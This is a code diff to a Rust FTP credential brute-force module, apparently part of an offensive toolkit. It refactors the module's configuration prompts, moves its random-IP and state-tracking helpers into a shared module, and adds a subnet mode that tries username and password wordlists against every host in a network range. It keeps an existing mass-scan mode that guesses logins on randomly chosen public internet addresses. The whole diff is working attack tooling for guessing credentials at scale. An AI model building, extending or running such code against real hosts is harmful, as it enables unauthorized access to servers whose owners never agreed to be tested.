@@ -7,26 +7,25 @@ use std::{
     io::Write,
     sync::Arc,
     time::Duration,
-    net::{IpAddr, Ipv4Addr, SocketAddr},
+    net::{IpAddr, SocketAddr},
 };
 use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
 use tokio::{
     sync::{Mutex, Semaphore},
     time::{sleep, timeout},
-    process::Command,
     fs::OpenOptions,
     io::AsyncWriteExt,
     net::TcpStream,
 };
 use futures::stream::{FuturesUnordered, StreamExt};
-use rand::Rng;
 
 use crate::utils::{
-    prompt_required, prompt_default, prompt_yes_no, 
-    prompt_int_range, prompt_existing_file, prompt_port,
+    cfg_prompt_port, cfg_prompt_existing_file, cfg_prompt_int_range,
+    cfg_prompt_yes_no,
+    cfg_prompt_output_file,
     load_lines, get_filename_in_current_dir
 };
-use crate::modules::creds::utils::BruteforceStats;
+use crate::modules::creds::utils::{BruteforceStats, generate_random_public_ip, is_ip_checked, mark_ip_checked, parse_exclusions, is_subnet_target, parse_subnet, subnet_host_count};
 
 const PROGRESS_INTERVAL_SECS: u64 = 2;
 const DEFAULT_TIMEOUT_SECS: u64 = 10;
@@ -135,75 +134,36 @@ pub async fn run(target: &str) -> Result<()> {
         return run_mass_scan(target).await;
     }
 
+    if is_subnet_target(target) {
+        println!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());
+        return run_subnet_scan(target).await;
+    }
+
     println!("{}", format!("[*] Target: {}", target).cyan());
 
     // --- Standard Single Target Logic ---
-    
-    // Check for API-provided config
-    let config = crate::config::get_module_config();
 
-    // Get port - from API config or prompt
-    let port: u16 = if let Some(p) = config.port {
-        p
-    } else {
-        prompt_port("FTP Port", 21)?
-    };
-    
-    // Get wordlists - from API config or prompt
-    let usernames_file = if let Some(ref f) = config.username_wordlist {
-        if !std::path::Path::new(f).exists() {
-            return Err(anyhow!("Username wordlist not found: {}", f));
-        }
-        f.clone()
-    } else {
-        prompt_required("Username wordlist")?
-    };
-    
-    let passwords_file = if let Some(ref f) = config.password_wordlist {
-        if !std::path::Path::new(f).exists() {
-            return Err(anyhow!("Password wordlist not found: {}", f));
-        }
-        f.clone()
-    } else {
-        prompt_required("Password wordlist")?
-    };
-    
-    let concurrency: usize = config.concurrency.unwrap_or_else(|| {
-        loop {
-            let input = prompt_default("Max concurrent tasks", "500").unwrap_or_else(|_| "500".to_string());
-            if let Ok(n) = input.parse::<usize>() {
-                if n > 0 { return n }
-            }
-            println!("Invalid number. Try again.");
-        }
-    });
+    let port = cfg_prompt_port("port", "FTP Port", 21)?;
+
+    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist file")?;
+    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist file")?;
+
+    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent tasks", 500, 1, 10000)? as usize;
 
     // Create a semaphore to limit concurrent network operations
     let semaphore = Arc::new(Semaphore::new(concurrency));
 
-    let stop_on_success = config.stop_on_success.unwrap_or_else(|| {
-        prompt_yes_no("Stop on first success?", true).unwrap_or(true)
-    });
-    
-    let save_results = config.save_results.unwrap_or_else(|| {
-        prompt_yes_no("Save results to file?", true).unwrap_or(true)
-    });
-    
+    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true)?;
+    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true)?;
+
     let save_path = if save_results {
-        Some(config.output_file.clone().unwrap_or_else(|| {
-            prompt_default("Output file", "ftp_results.txt").unwrap_or_else(|_| "ftp_results.txt".to_string())
-        }))
+        Some(cfg_prompt_output_file("output_file", "Output file", "ftp_results.txt")?)
     } else {
         None
     };
-    
-    let verbose = config.verbose.unwrap_or_else(|| {
-        prompt_yes_no("Verbose mode?", false).unwrap_or(false)
-    });
-    
-    let combo_mode = config.combo_mode.unwrap_or_else(|| {
-        prompt_yes_no("Combination mode (user × pass)?", false).unwrap_or(false)
-    });
+
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
+    let combo_mode = cfg_prompt_yes_no("combo_mode", "Combination mode (user × pass)?", false)?;
 
     let display_addr = format_addr_for_display(target, port);
     let connect_addr = format_addr_for_display(target, port);
@@ -297,8 +257,8 @@ pub async fn run(target: &str) -> Result<()> {
                             stats_clone.record_attempt(false, true);
                             let msg = e.to_string();
                             {
-                                let mut _unknown_clone = unknown_clone.lock().await;
-                                _unknown_clone.push((
+                                let mut guard = unknown_clone.lock().await;
+                                guard.push((
                                     display_addr_clone.clone(),
                                     user_clone.clone(),
                                     pass_clone.clone(),
@@ -430,53 +390,32 @@ pub async fn run(target: &str) -> Result<()> {
 }
 
 async fn run_mass_scan(target: &str) -> Result<()> {
-    // Get API config
-    let config = crate::config::get_module_config();
+    // Prep — use cfg_prompt_* for API compatibility
+    let port = cfg_prompt_port("port", "FTP Port", 21)?;
 
-    // Prep - use API config or prompt
-    let port: u16 = config.port.unwrap_or_else(|| prompt_port("FTP Port", 21).unwrap_or(21));
-    
-    let usernames_file = if let Some(ref f) = config.username_wordlist {
-        f.clone()
-    } else {
-        prompt_existing_file("Username wordlist")?
-    };
-    
-    let passwords_file = if let Some(ref f) = config.password_wordlist {
-        f.clone()
-    } else {
-        prompt_existing_file("Password wordlist")?
-    };
-    
+    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
+    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
+
     let users = load_lines(&usernames_file)?;
-    let pass_lines = load_lines(&passwords_file)?
-;
+    let pass_lines = load_lines(&passwords_file)?;
 
     if users.is_empty() { return Err(anyhow!("User list empty")); }
     if pass_lines.is_empty() { return Err(anyhow!("Pass list empty")); }
 
-    let concurrency = config.concurrency.unwrap_or_else(|| {
-        prompt_int_range("Max concurrent hosts to scan", 500, 1, 10000).unwrap_or(500) as usize
-    });
-    let verbose = config.verbose.unwrap_or_else(|| {
-        prompt_yes_no("Verbose mode?", false).unwrap_or(false)
-    });
-    let output_file = config.output_file.clone().unwrap_or_else(|| {
-        prompt_default("Output result file", "ftp_brute_mass_results.txt").unwrap_or_else(|_| "ftp_brute_mass_results.txt".to_string())
-    });
+    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts to scan", 500, 1, 10000)? as usize;
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
+    let output_file = cfg_prompt_output_file("output_file", "Output result file", "ftp_brute_mass_results.txt")?;
 
-    let use_exclusions = prompt_yes_no("Exclude reserved/private ranges?", true).unwrap_or(true);
-    
+    let use_exclusions = cfg_prompt_yes_no("exclude_reserved", "Exclude reserved/private ranges?", true)?;
+
     // Parse exclusions
-    let mut exclusion_subnets = Vec::new();
-    if use_exclusions {
-        for cidr in EXCLUDED_RANGES {
-            if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
-                exclusion_subnets.push(net);
-            }
-        }
-        println!("{}", format!("[+] Loaded {} exclusion ranges", exclusion_subnets.len()).cyan());
-    }
+    let exclusion_subnets = if use_exclusions {
+        let subs = parse_exclusions(EXCLUDED_RANGES);
+        println!("{}", format!("[+] Loaded {} exclusion ranges", subs.len()).cyan());
+        subs
+    } else {
+        Vec::new()
+    };
     let exclusions = Arc::new(exclusion_subnets);
 
     let semaphore = Arc::new(Semaphore::new(concurrency));
@@ -516,8 +455,8 @@ async fn run_mass_scan(target: &str) -> Result<()> {
              
              tokio::spawn(async move {
                  let ip = generate_random_public_ip(&exc);
-                 if !is_ip_checked(&ip).await {
-                     mark_ip_checked(&ip).await;
+                 if !is_ip_checked(&ip, STATE_FILE).await {
+                     mark_ip_checked(&ip, STATE_FILE).await;
                      mass_scan_host(ip, port, cp, sf, of, verbose).await;
                  }
                  sc.fetch_add(1, Ordering::Relaxed);
@@ -545,8 +484,8 @@ async fn run_mass_scan(target: &str) -> Result<()> {
              
              if let Ok(ip) = ip_str.parse::<IpAddr>() {
                  tokio::spawn(async move {
-                    if !is_ip_checked(&ip).await {
-                        mark_ip_checked(&ip).await;
+                    if !is_ip_checked(&ip, STATE_FILE).await {
+                        mark_ip_checked(&ip, STATE_FILE).await;
                         mass_scan_host(ip, port, cp, sf, of, verbose).await;
                     }
                     sc.fetch_add(1, Ordering::Relaxed);
@@ -561,6 +500,64 @@ async fn run_mass_scan(target: &str) -> Result<()> {
         }
     }
     
+    Ok(())
+}
+
+async fn run_subnet_scan(target: &str) -> Result<()> {
+    let network = parse_subnet(target)?;
+    let count = subnet_host_count(&network);
+    println!("{}", format!("[*] Subnet {} — {} hosts to scan", target, count).cyan());
+
+    let port = cfg_prompt_port("port", "FTP Port", 21)?;
+    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
+    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
+    let users = load_lines(&usernames_file)?;
+    let pass_lines = load_lines(&passwords_file)?;
+    if users.is_empty() { return Err(anyhow!("User list empty")); }
+    if pass_lines.is_empty() { return Err(anyhow!("Pass list empty")); }
+
+    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000)? as usize;
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
+    let output_file = cfg_prompt_output_file("output_file", "Output result file", "ftp_subnet_results.txt")?;
+
+    let semaphore = Arc::new(Semaphore::new(concurrency));
+    let stats_checked = Arc::new(AtomicUsize::new(0));
+    let stats_found = Arc::new(AtomicUsize::new(0));
+    let creds_pkg = Arc::new((users, pass_lines));
+    let total = count;
+
+    let s_checked = stats_checked.clone();
+    let s_found = stats_found.clone();
+    tokio::spawn(async move {
+        loop {
+            tokio::time::sleep(std::time::Duration::from_secs(5)).await;
+            println!("[*] Status: {}/{} IPs scanned, {} valid credentials found",
+                s_checked.load(Ordering::Relaxed), total,
+                s_found.load(Ordering::Relaxed).to_string().green().bold());
+        }
+    });
+
+    for ip in network.iter() {
+        let permit = semaphore.clone().acquire_owned().await.context("Semaphore")?;
+        let cp = creds_pkg.clone();
+        let sc = stats_checked.clone();
+        let sf = stats_found.clone();
+        let of = output_file.clone();
+
+        tokio::spawn(async move {
+            mass_scan_host(ip, port, cp, sf, of, verbose).await;
+            sc.fetch_add(1, Ordering::Relaxed);
+            drop(permit);
+        });
+    }
+
+    for _ in 0..concurrency {
+        let _ = semaphore.acquire().await.context("Semaphore")?;
+    }
+
+    println!("\n{}", format!("[*] Subnet scan complete. {} hosts scanned, {} credentials found.",
+        stats_checked.load(Ordering::Relaxed),
+        stats_found.load(Ordering::Relaxed)).cyan().bold());
     Ok(())
 }
 
@@ -692,42 +689,3 @@ async fn try_ftp_login(addr: &str, target: &str, user: &str, pass: &str, verbose
     }
 }
 
-fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
-    let mut rng = rand::rng();
-    loop {
-        let octets: [u8; 4] = rng.random();
-        let ip = Ipv4Addr::from(octets);
-        let ip_addr = IpAddr::V4(ip);
-        let mut excluded = false;
-        for net in exclusions {
-            if net.contains(ip_addr) {
-                excluded = true;
-                break;
-            }
-        }
-        if !excluded { return ip_addr; }
-    }
-}
-
-async fn is_ip_checked(ip: &impl ToString) -> bool {
-    if !std::path::Path::new(STATE_FILE).exists() {
-        return false;
-    }
-    let ip_s = ip.to_string();
-    let status = Command::new("grep")
-        .arg("-F")
-        .arg("-q")
-        .arg(format!("checked: {}", ip_s))
-        .arg(STATE_FILE)
-        .stderr(std::process::Stdio::null())
-        .status()
-        .await;
-    match status { Ok(s) => s.success(), Err(_) => false }
-}
-
-async fn mark_ip_checked(ip: &impl ToString) {
-    let data = format!("checked: {}\n", ip.to_string());
-    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(STATE_FILE).await {
-        let _ = file.write_all(data.as_bytes()).await;
-    }
-}
